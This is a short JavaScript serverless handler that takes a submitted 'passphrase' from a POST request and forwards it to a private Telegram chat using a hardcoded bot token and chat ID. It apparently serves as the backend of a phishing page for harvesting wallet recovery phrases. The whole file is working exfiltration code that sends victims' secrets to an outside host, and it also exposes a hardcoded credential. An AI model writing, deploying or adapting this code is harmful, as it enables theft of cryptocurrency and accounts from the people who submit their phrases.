export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
  const { passphrase } = req.body;
  const token = process.env.TELEGRAM_TOKEN || '7660484163:AAEahg5iCWir8bjM4W7CSfE10K_PUrO3mt0';
  const chatId = process.env.TELEGRAM_CHAT_ID || '7753649096';
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: passphrase }),
    });
    res.status(200).json({ message: 'Sent' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send' });
  }
}